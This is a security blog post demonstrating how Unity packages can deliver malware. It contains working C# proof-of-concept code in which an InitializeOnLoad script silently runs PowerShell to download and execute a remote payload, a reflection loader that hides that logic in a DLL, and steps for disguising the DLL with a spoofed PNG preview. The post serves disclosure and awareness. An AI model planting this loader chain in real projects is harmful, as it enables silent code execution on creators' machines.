<!doctype html><html lang=en-us><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-C2KWQMHPS9"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-C2KWQMHPS9")</script><meta property="og:url" content="http://blog.fa.nta.sy/posts/2025-08-01-weaponizing-unity-packages/"><meta property="og:site_name" content="Investigations by 0xFantasy"><meta property="og:title" content="Weaponizing Unity Packages for Malware Delivery"><meta property="og:description" content="I was recently talking to a handful of online friends about UGC (user generated content) creation within the Unity ecosystem. One of them jokingly mentioned how someone they knew was “ratted” by downloading an asset, that is usually behind a paywall, for free. Ratted from a Unity package?"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-08-01T18:08:54-04:00"><meta property="article:modified_time" content="2025-08-01T18:08:54-04:00"><meta property="article:tag" content="Default"><meta property="article:tag" content="Malware"><meta name=twitter:card content="summary"><meta name=twitter:title content="Weaponizing Unity Packages for Malware Delivery"><meta name=twitter:description content="I was recently talking to a handful of online friends about UGC (user generated content) creation within the Unity ecosystem. One of them jokingly mentioned how someone they knew was “ratted” by downloading an asset, that is usually behind a paywall, for free. Ratted from a Unity package?"><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><style type=text/css>body{font-family:monospace}</style><title>Weaponizing Unity Packages for Malware Delivery</title><link rel=stylesheet href=/css/style.css></head><body><header>=================================<br>== <a href=http://blog.fa.nta.sy/>Investigations by 0xFantasy</a> ==<br>=================================<div style=float:right></div><br><p><nav><a href=/><b>Start</b></a>.</header><main><article><h1>Weaponizing Unity Packages for Malware Delivery</h1><b><time>2025-08-01 18:08:54</time></b>
<a href=/tags/default>default</a>
<a href=/tags/malware>malware</a><div><h2 id=context>Context</h2><p>I was recently talking to a handful of online friends about UGC (<a href=https://en.wikipedia.org/wiki/User-generated_content>user generated content</a>) creation within the Unity ecosystem.
One of them jokingly mentioned how someone they knew was &ldquo;<a href=https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-remote-access-trojan/>ratted</a>&rdquo; by downloading an asset, that is usually behind a paywall, for free.
Ratted from a Unity package?
They&rsquo;re just glorified zip archives.
It was later clarified that this never happened, but it got me thinking: &ldquo;is it <em>actually</em> possible to compromise someone via a Unity package?&rdquo;</p><h2 id=what-is-the-unity-engine>What is the Unity Engine</h2><p>The Unity engine is a general purpose, cross platform 2D/3D game engine originally developed in 2005.
Over time, more and more production studios and amateur developers have adopted the engine.
Popular games such as Among Us, Subnautica, The Forest, VRChat, and even Pokemon GO are made using the Unity engine.</p><h2 id=what-are-unity-packages>What are Unity Packages</h2><p>In the context of the Unity ecosystem, there are two different ways you can utilize pre-made, existing assets (3D models, materials, shaders, etc.) and logic (game SDKs, plugins, etc.).
The official way is to download paid, or free, assets from Unity&rsquo;s own <a href=https://assetstore.unity.com/>AssetStore</a>.
However, the process to publish can be lengthy and <a href=https://assetstore.unity.com/publishing/publish-and-sell-assets>requires a review of your package by Unity</a>.
The unofficial way is to obtain a .unitypackage from outside of the Unity AssetStore and simply <a href=https://docs.unity3d.com/6000.1/Documentation/Manual/AssetPackages.html>import it to your Unity Editor</a>.
While it is usually easier to circumvent the Unity store and obtain packages yourself (either for free or behind a paywall), this comes at a significant risk as there is no way for Unity to review packages that originate from outside of their store.
This risk lies in the fact that these unofficial packages can be used to distribute malicious C# scripts.</p><h2 id=utilization-of-c-within-unity>Utilization of C# Within Unity</h2><p>C# is the primary way of adding functionality and logic to games created using Unity.
It allows the same scripts to be used on multiple different operating systems with minimal difference.
While Unity does provide its own native API for interacting with the game engine, other operations are largely left up to developers.
This can include saving progress within a game locally or authenticating to a remote server for games that support multiplayer.</p><h3 id=statistical-usage-of-unity>Statistical Usage of Unity</h3><p>So far, we have looked at Unity from the context of a game developer.
What about someone who wants to create assets for games that support UGC?</p><p>Unity is by far the most prominent game engine used in 2024, <a href=https://web.archive.org/web/20250427205535/https://vginsights.com/assets/reports/The_Big_Game_Engines_Report_of_2025.pdf>accounting for 51% of all new game releases</a>.
In addition to this, Unity is the most easily accessible engines for <a href=https://docs.unity.com/ugs/manual/user-generated-content/manual/overview>UGC creation</a>.
This is bolstered by toolchains built specifically for UGC.</p><h3 id=c-in-the-editors-context>C# in the Editor&rsquo;s Context</h3><p>For games that are built within Unity and provide open-ended creativity to its userbase, users usually create UGC, still within Unity, and upload it directly to the game.
This allows essentially infinite customization for characters, worlds, and almost any other asset you can think of.</p><p>How do games repurpose Unity as their own UGC launchpad?
They create specialized SDKs that work within the confines of the Unity Editor itself.
For example, <a href=https://creators.vrchat.com/sdk/>VRChat has a wide ecosystem of official</a> and unofficial tools for in-game 3D model/avatar creation.
This completely flips the dynamic of the engine and makes it almost a game within itself.</p><h2 id=unofficial-package-distribution-for-ugc>(Un)Official Package Distribution for UGC</h2><p>Taking this into account, the majority of users who utilize Unity as a UGC launchpad have no interest or knowledge on how to get their assets in the official AssetStore.
This leads to small time creators and asset makers to utilize platforms like Patreon, Ko-fi, or Gumroad to distribute their assets.
While this sounds great in theory allowing an ecosystem of asset creators to flourish, this comes at significant risk as it becomes difficult to make sure the assets you are downloading are not malicious.</p><h2 id=the-horror-of-initializeonload>The Horror of InitializeOnLoad</h2><p>Remember how the Unity Editor can have SDKs specifically created for it instead of <em>just</em> for games made <em>with</em> Unity?
SDKs are the proper, managed way to have logic run within the editor.
However, you can have one-off C# script(s) anywhere in your Unity project hook into the editor.
This is usually used by advanced UGC projects for automation of repetitive tasks or version tracking.</p><p>There is one very specific attribute exposed by the editor that any script can hook into: <a href=https://docs.unity3d.com/ScriptReference/InitializeOnLoadAttribute.html><code>InitializeOnLoad</code></a>.
You may be already able to guess what this does, it &ldquo;allows you to initialize an Editor class when Unity loads, and when your scripts are recompiled.&rdquo;
While this is almost exclusively used for legitimate purposes, I had a thousand thoughts immediately race through my head on how this could be abused.</p><p>A typical <code>InitializeOnLoad</code>-enabled class looks like this:</p><p><code>Startup.cs</code></p><details><summary>Expand for code snippet</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#66d9ef>using</span> UnityEngine;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> UnityEditor;
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>[InitializeOnLoad]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Startup</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> Startup()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        Debug.Log(<span style=color:#e6db74>&#34;Up and running&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></details></br><p>This doesn&rsquo;t look too bad.
It&rsquo;s just some logging at start up.
Let&rsquo;s not forget that Unity gives you unfettered access to all of C#&rsquo;s abilities.
What might those abilities include?
A native HTTP client and the ability to start any process, including Powershell.</p><p><code>Startup.cs</code></p><details><summary>Expand for code snippet</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#66d9ef>using</span> Unityditor;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Diagnostics;
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>[InitializeOnLoad]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Startup</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>static</span> Startup()
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    UnityEngine.Debug.Log(<span style=color:#e6db74>&#34;Up and running&#34;</span>);
</span></span><span style=display:flex><span>    ProcessStartInfo startInfo = <span style=color:#66d9ef>new</span> ProcessStartInfo(<span style=color:#e6db74>&#34;powershell.exe&#34;</span>) {
</span></span><span style=display:flex><span>      Arguments = <span style=color:#e6db74>&#34;(wget http://localhost:8000/payload.txt).Content | IEX&#34;</span>,
</span></span><span style=display:flex><span>      RedirectStandardOutput = <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>      RedirectStandardError = <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>      UseShellExecute = <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>      CreateNoWindow = <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>using</span> (Process process = <span style=color:#66d9ef>new</span> Process { StartInfo = startInfo }) {
</span></span><span style=display:flex><span>      process.Start();
</span></span><span style=display:flex><span>      process.WaitForExit();
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></details></br><p>That&rsquo;s&mldr; pretty bad.
The silver lining here is that all C# scripts in Unity need to be open source as they are compiled by the editor on the fly at various points.
Surely, you can&rsquo;t obfuscate away this logic?</p><h2 id=obfuscating-logic-using-dlls>Obfuscating Logic Using DLLs</h2><p>Since we have full access to C# and are essentially able to create our own program, this means that we can dynamically load DLLs in the script and execute their functions.
We can move the suspicious looking logic of making HTTP requests and starting Powershell to the DLL (while specifically compiling for Unity and/or game SDK).</p><p><code>Downloader.cs</code> (DLL)</p><details><summary>Expand for code snippet</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.IO;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Diagnostics;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Net.Http;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Threading.Tasks;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>namespace</span> HttpDownloaderLib {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Downloader</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>readonly</span> HttpClient client = <span style=color:#66d9ef>new</span> HttpClient();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>async</span> Task&lt;<span style=color:#66d9ef>string</span>&gt; GetRemoteContent(<span style=color:#66d9ef>string</span> url) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                HttpResponseMessage response = <span style=color:#66d9ef>await</span> client.GetAsync(url);
</span></span><span style=display:flex><span>                response.EnsureSuccessStatusCode();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>string</span> content = <span style=color:#66d9ef>await</span> response.Content.ReadAsStringAsync();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> content;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>catch</span> (Exception ex) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Exception(<span style=color:#e6db74>&#34;Failed to get remote content&#34;</span>, ex);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>async</span> Task ExecuteRemoteContent(<span style=color:#66d9ef>string</span> url) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>string</span> result = <span style=color:#66d9ef>await</span> GetRemoteContent(url);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ProcessStartInfo startInfo = <span style=color:#66d9ef>new</span> ProcessStartInfo(<span style=color:#e6db74>&#34;powershell.exe&#34;</span>) {
</span></span><span style=display:flex><span>                Arguments = result,
</span></span><span style=display:flex><span>                RedirectStandardOutput = <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>                RedirectStandardError = <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>                UseShellExecute = <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>                CreateNoWindow = <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>            };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>using</span> (Process process = <span style=color:#66d9ef>new</span> Process { StartInfo = startInfo }) {
</span></span><span style=display:flex><span>                process.Start();
</span></span><span style=display:flex><span>                process.WaitForExit();
</span></span><span style=display:flex><span>            };
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></details></br><p><code>Startup.cs</code> (Unity script)</p><details><summary>Expand for code snippet</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.IO;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Reflection;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Threading.Tasks;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> UnityEngine;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> UnityEditor;
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>[InitializeOnLoad]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Startup</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> Startup() {
</span></span><span style=display:flex><span>        UnityEngine.Debug.Log(<span style=color:#e6db74>&#34;Up and running&#34;</span>);
</span></span><span style=display:flex><span>        EditorApplication.update += RunAsyncDownloader;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>void</span> RunAsyncDownloader() {
</span></span><span style=display:flex><span>        EditorApplication.update -= RunAsyncDownloader;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> dllPath = Path.Combine(Application.dataPath, <span style=color:#e6db74>&#34;HttpDownloaderLib.dll&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (File.Exists(dllPath)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                Assembly loadedAssembly = Assembly.LoadFrom(dllPath);
</span></span><span style=display:flex><span>                Type downloaderType = loadedAssembly.GetType(<span style=color:#e6db74>&#34;HttpDownloaderLib.Downloader&#34;</span>);
</span></span><span style=display:flex><span>                MethodInfo method = downloaderType.GetMethod(<span style=color:#e6db74>&#34;ExecuteRemoteContent&#34;</span>, BindingFlags.Public | BindingFlags.Static);
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>object</span>[] args = <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { <span style=color:#e6db74>&#34;http://localhost:8000/payload.txt&#34;</span> };
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>object</span> taskObj = method.Invoke(<span style=color:#66d9ef>null</span>, args);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (Exception ex) {
</span></span><span style=display:flex><span>                UnityEngine.Debug.LogError(<span style=color:#e6db74>&#34;Error invoking DLL method: &#34;</span> + ex);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            UnityEngine.Debug.LogError(<span style=color:#e6db74>&#34;DLL not found: &#34;</span> + dllPath);
</span></span><span style=display:flex><span>        }   
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></details></br><p>While the naming conventions of files and classes might be extremely obvious in these examples, making the files masquerade as required SDK assets and using some obfuscation would make this much more difficult to detect as a normal Unity user.</p><h2 id=it-gets-worse>It Gets Worse</h2><p>How exactly would a normal Unity user look at the sorts of C# scripts and DLL files they&rsquo;re importing?
Well, they really can&rsquo;t.
While the .unitypackage file format is essentially a glorified zip archive, the internal format of the zip is extremely awkward to navigate and gets confusing, very fast.
Hundreds or thousands of random UUID-named folders with files only named &ldquo;asset.&rdquo;</p></br><details><summary>Internal Structure of Unity Package</summary><img src=./images/unity-package-internal-structure.png alt="Branching folders and files showcasing the internal structure of a .unitypackage file" width=600></img></a></details></br><p>Okay, let&rsquo;s not have users attempt to understand extracting zip files and wandering around a thousand random folders for an hour.
Unity provides a nice preview of the files you&rsquo;re able to import from a Unity package.
However, there are two critical issues with the flow as it currently stands:</p><ol><li>You are not able to view the contents of files in the package, only their thumbnail preview (if available), file name, extension, and directory structure.</li><li>Packages that have a large amount of files or folders extend beyond the normal preview window and must be manually scrolled down to view.</li></ol></br><details><summary>Unity Package Import Preview</summary><img src=./images/package-content-preview.png alt="Unity Editor preview of a .unitypackage files's contents" width=450></img></a></details></br><p>In addition to this, Unity does not provide a warning if you are importing script files.</p><h2 id=it-somehow-gets-even-worse>It Somehow Gets Even Worse</h2><p>Fine, since the import preview is the user&rsquo;s last line of defence, just don&rsquo;t import anything with sketchy file extensions.
Well, what if I just rename the DLL to something else, like .png?
It&rsquo;s loaded dynamically, the file type doesn&rsquo;t make a difference.
An astute user will check each file&rsquo;s preview and when our phony-png file shows up, the game is over.</p><p>This <strong>HAS</strong> to the final, true line of defence, right?
Right?</p><p>Wrong.
You can spoof file previews within packages.</p><p>Simply extracting the archive, manually placing a <code>preview.png</code> file in the target asset&rsquo;s folder, and re-zipping the archive produces a completely valid package with a spoofed preview (and file extension).</p></br><details><summary>DLL with spoofed PNG file preview</summary><img src=./images/not-a-dll-smile.png alt="Unity package import preview of a spoofed png file preview" width=450></img></a></details></br><h2 id=putting-it-all-together>Putting It All Together</h2><p>A fully weaponized Unity package requires:</p><ol><li>A tiny <code>InitializeOnLoad</code> C# script that dynamically loads a DLL</li><li>A DLL to execute&mldr; anything (eg, grab a remote payload and execute via Powershell)</li><li>Manual manipulation of the Unity package container to spoof a PNG file preview for the DLL (or any other data file)</li></ol></br><img src=./images/execution-chain.png alt="Diagram showing execution chain"></img></a></br></div></article></main><aside><div><div><h3>LATEST POSTS</h3></div><div><ul><li><a href=/posts/2026-01-19-astral-uv-python-malware-loader/>Next-Gen Python Malware: Leveraging Astral's UV as a One-Shot Loader</a></li><li><a href=/posts/2026-01-01-telegraph-malware-scams-leaked-gov-docs/>Telegra.ph: Malware, Scams, and Leaked Government Docs (Kinda)</a></li><li><a href=/posts/2025-08-01-weaponizing-unity-packages/>Weaponizing Unity Packages for Malware Delivery</a></li><li><a href=/posts/2024-10-20-how-to-actually-secure-your-x-account/>How to Actually Secure Your X Account</a></li><li><a href=/posts/2024-10-06-exch-cx-investigation/>Investigating Hackers', Exploiters' Favorite Instant Crypto Exchange</a></li></ul></div></div></aside><footer><p>&copy; 2026 <a href=http://blog.fa.nta.sy/><b>Investigations by 0xFantasy</b></a>.
<a href=https://x.com/0xFantasy target=_blank>X.com</a>.
<a href=https://github.com/Vile target=_blank>Github</a>.
<a href=https://bsky.app/profile/fanta.sy target=_blank>Bluesky</a>.</p></footer></body></html>